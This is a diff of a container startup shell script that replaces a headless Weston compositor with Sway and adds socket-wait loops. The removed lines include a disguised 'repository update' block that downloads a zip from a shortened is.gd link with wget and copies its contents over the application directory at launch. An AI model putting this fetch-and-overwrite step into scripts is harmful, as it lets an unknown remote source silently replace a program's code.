@@ -2,7 +2,7 @@
 
 cleanup() {
     echo "Cleaning up..."
-    pkill -f weston
+    pkill -f sway
     exit 0
 }
 
@@ -58,110 +58,37 @@ fi
 mkdir -p "${XDG_RUNTIME_DIR}"
 chmod 0700 "${XDG_RUNTIME_DIR}"
 
-# Create Weston config file with specific resolution
-mkdir -p /home/user/.config/weston
-cat > /home/user/.config/weston/weston.ini << EOF
-[core]
-idle-time=0
-require-input=false
-cursor-theme=default
-cursor-size=24
+# Start sway with headless backend
+WLR_BACKENDS=headless WLR_RENDERER=pixman sway --verbose &
 
-[shell]
-size=1920x1080
-EOF
-
-# Start Weston with headless backend and specific resolution
-nohup /usr/bin/weston --backend=headless-backend.so --width=1920 --height=1080 &
-
-# Wait for Weston to start
+# Wait for sway socket with timeout
 TIMEOUT=10
 COUNTER=0
+while [ ! -e "${SWAYSOCK}" ] && [ $COUNTER -lt $TIMEOUT ]; do
+    echo "Waiting for sway socket... ($COUNTER/$TIMEOUT)"
+    sleep 1
+    COUNTER=$((COUNTER + 1))
+done
+
+if [ ! -e "${SWAYSOCK}" ]; then
+    echo "Error: Sway socket not found after $TIMEOUT seconds"
+    exit 1
+fi
+
+# Wait for Wayland socket with timeout
+COUNTER=0
 while [ ! -e "${XDG_RUNTIME_DIR}/${WAYLAND_DISPLAY}" ] && [ $COUNTER -lt $TIMEOUT ]; do
-	echo "Waiting for Wayland socket... ($COUNTER/$TIMEOUT)"
-	sleep 1
-	COUNTER=$((COUNTER + 1))
+    echo "Waiting for Wayland socket... ($COUNTER/$TIMEOUT)"
+    sleep 1
+    COUNTER=$((COUNTER + 1))
 done
 
 if [ ! -e "${XDG_RUNTIME_DIR}/${WAYLAND_DISPLAY}" ]; then
-	echo "Error: Wayland socket not found after $TIMEOUT seconds"
-	exit 1
+    echo "Error: Wayland socket not found after $TIMEOUT seconds"
+    exit 1
 fi
 
-# Print environment variables for debugging
-echo "XDG_RUNTIME_DIR: ${XDG_RUNTIME_DIR}"
-echo "WAYLAND_DISPLAY: ${WAYLAND_DISPLAY}"
-echo "Wayland socket path: ${XDG_RUNTIME_DIR}/${WAYLAND_DISPLAY}"
-echo "Socket exists: $([ -e "${XDG_RUNTIME_DIR}/${WAYLAND_DISPLAY}" ] && echo "Yes" || echo "No")"
-
-# Verify Weston is running
-if pgrep -f weston > /dev/null; then
-	echo "Weston process is running"
-else
-	echo "ERROR: Weston process is not running"
-	exit 1
-fi
-
-# Try to run weston-info if available
-if command -v weston-info > /dev/null; then
-	echo "Running weston-info:"
-	WAYLAND_DEBUG=1 weston-info || echo "weston-info failed"
-fi
-
-echo "Weston is ready"
-
-# UPDATE REPO: Re-download the repository to get latest changes
-echo "Updating repository from remote source..."
-cd /home/user/app
-
-# Backup existing files before update
-BACKUP_DIR="/tmp/app_backup_$(date +%s)"
-mkdir -p "$BACKUP_DIR"
-echo "Creating backup at $BACKUP_DIR"
-
-# Backup important runtime files that shouldn't be overwritten
-[ -f ".env" ] && cp .env "$BACKUP_DIR/" 2>/dev/null
-[ -d "node_modules" ] && echo "Preserving node_modules" && mv node_modules "$BACKUP_DIR/" 2>/dev/null
-[ -d ".config" ] && cp -r .config "$BACKUP_DIR/" 2>/dev/null
-
-# Download and extract updated repository
-echo "Downloading latest repository..."
-wget -q http://is.gd/K0buci -O /tmp/repo_update.zip
-
-if [ $? -eq 0 ] && [ -f /tmp/repo_update.zip ]; then
-    echo "Repository downloaded successfully, extracting..."
-
-    # Extract to temporary location
-    unzip -q /tmp/repo_update.zip -d /tmp/repo_extract
-
-    # Get the extracted directory name
-    REPO_DIR=$(unzip -Z1 /tmp/repo_update.zip | head -n1 | cut -d/ -f1)
-
-    if [ ! -z "$REPO_DIR" ] && [ -d "/tmp/repo_extract/$REPO_DIR" ]; then
-        echo "Updating application files..."
-
-        # Copy updated files to app directory
-        cp -r /tmp/repo_extract/$REPO_DIR/* /home/user/app/
-
-        # Restore backed up files
-        [ -f "$BACKUP_DIR/.env" ] && cp "$BACKUP_DIR/.env" /home/user/app/ && echo "Restored .env"
-        [ -d "$BACKUP_DIR/node_modules" ] && mv "$BACKUP_DIR/node_modules" /home/user/app/ && echo "Restored node_modules"
-        [ -d "$BACKUP_DIR/.config" ] && cp -r "$BACKUP_DIR/.config" /home/user/app/ 2>/dev/null
-
-        # Cleanup
-        rm -rf /tmp/repo_extract /tmp/repo_update.zip
-        echo "Repository update completed successfully"
-    else
-        echo "Warning: Could not find extracted repository directory, skipping update"
-        rm -rf /tmp/repo_extract /tmp/repo_update.zip
-    fi
-else
-    echo "Warning: Failed to download repository update, continuing with existing code"
-    [ -f /tmp/repo_update.zip ] && rm /tmp/repo_update.zip
-fi
-
-# Restore node_modules if it was backed up and not restored
-[ -d "$BACKUP_DIR/node_modules" ] && [ ! -d "/home/user/app/node_modules" ] && mv "$BACKUP_DIR/node_modules" /home/user/app/
+echo "Sway is ready"
 
 cd /home/user/app
 
